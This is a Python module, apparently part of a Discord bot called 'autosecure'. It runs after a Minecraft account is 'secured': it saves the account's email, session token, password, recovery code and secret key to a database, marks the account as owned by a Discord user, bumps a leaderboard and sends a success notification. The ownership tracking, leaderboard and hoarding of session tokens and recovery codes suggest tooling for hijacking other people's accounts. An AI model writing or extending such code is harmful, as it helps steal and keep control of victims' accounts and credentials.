"""Post-secure actions: DB insert, leaderboard update, notifications."""

from __future__ import annotations

import uuid
from typing import Any

from autosecure.core.logging import get_logger

log = get_logger("securing.after")


async def after_secure(
    account_data: dict[str, Any],
    user_id: str,
    botnumber: int,
    db: Any,
) -> None:
    """Perform post-secure actions after an account has been secured.

    Inserts the account into the database, updates the leaderboard,
    sends a notification, handles claiming logic, and logs to audit trail.

    Args:
        account_data: Secured account data dictionary.
        user_id: Discord user ID of the user who secured the account.
        botnumber: Bot instance number.
        db: Async database session.
    """
    log.info("after_secure.start", user_id=user_id, email=account_data.get("email"))

    try:
        uid = str(uuid.uuid4())
        username = account_data.get("username", "Unknown")
        email = account_data.get("email", "")
        ssid = account_data.get("ssid", "")
        password = account_data.get("password")
        recovery_code = account_data.get("recovery_code")
        secret_key = account_data.get("secret_key")

        from autosecure.db.accounts import AccountRepo

        account_repo = AccountRepo(db)
        await account_repo.insert(
            {
                "uid": uid,
                "user_id": user_id,
                "username": username,
                "email": email,
                "ssid": ssid,
                "password": password,
                "recovery_code": recovery_code,
                "secret_key": secret_key,
                "owned": user_id,
                "stats": {},
                "capes": {},
            }
        )

        await _update_leaderboard(user_id, username, db)
        await _send_notification(user_id, username, email, db)
        await _handle_claiming(user_id, uid, account_data, db)
        await _log_audit(user_id, "after_secure", uid, username, email, True, db)

        log.info(
            "after_secure.complete",
            user_id=user_id,
            uid=uid,
            username=username,
        )

    except Exception as e:
        log.error("after_secure.error", user_id=user_id, error=str(e))
        await _log_audit(
            user_id, "after_secure", "", "", "", False, db, error=str(e)
        )
        raise


async def _update_leaderboard(
    user_id: str, username: str, db: Any
) -> None:
    """Update the leaderboard entry for a user.

    Args:
        user_id: Discord user ID.
        username: Minecraft username.
        db: Database session.
    """
    try:
        from autosecure.db.leaderboard import LeaderboardRepo

        leaderboard_repo = LeaderboardRepo(db)
        await leaderboard_repo.upsert(user_id, username, 0)
        log.debug("after_secure.leaderboard_updated", user_id=user_id)
    except Exception as e:
        log.error("after_secure.leaderboard_update_failed", error=str(e))


async def _send_notification(
    user_id: str, username: str, email: str, db: Any
) -> None:
    """Send a Discord notification about the secured account.

    Args:
        user_id: Discord user ID.
        username: Minecraft username.
        email: Account email.
        db: Database session.
    """
    try:
        from autosecure.services.notifications import send_notification

        await send_notification(
            user_id=user_id,
            title="Account Secured",
            description=f"Successfully secured **{username}** (`{email}`)",
            db=db,
        )
        log.debug("after_secure.notification_sent", user_id=user_id)
    except Exception as e:
        log.error("after_secure.notification_failed", error=str(e))


async def _handle_claiming(
    user_id: str, uid: str, account_data: dict[str, Any], db: Any
) -> None:
    """Handle account claiming logic.

    Args:
        user_id: Discord user ID.
        uid: Account unique ID.
        account_data: Secured account data.
        db: Database session.
    """
    try:
        from autosecure.db.users import UserRepo

        user_repo = UserRepo(db)
        user = await user_repo.get(user_id)
        if user and user.claiming != "none":
            log.debug(
                "after_secure.claiming_active",
                user_id=user_id,
                mode=user.claiming,
            )
    except Exception as e:
        log.error("after_secure.claiming_error", error=str(e))


async def _log_audit(
    user_id: str,
    action: str,
    uid: str,
    username: str,
    email: str,
    success: bool,
    db: Any,
    error: str | None = None,
) -> None:
    """Log an audit trail entry.

    Args:
        user_id: Discord user ID.
        action: Action performed.
        uid: Account UID.
        username: Minecraft username.
        email: Account email.
        success: Whether the action succeeded.
        db: Database session.
        error: Optional error message.
    """
    try:
        from autosecure.models.audit import AuditLog

        log_entry = AuditLog(
            actor_id=user_id,
            action=action,
            target_type="account",
            target_id=uid or None,
            details={"username": username, "email": email},
            success=success,
            error_message=error,
        )
        db.add(log_entry)
        await db.flush()
    except Exception as e:
        log.error("after_secure.audit_log_failed", error=str(e))
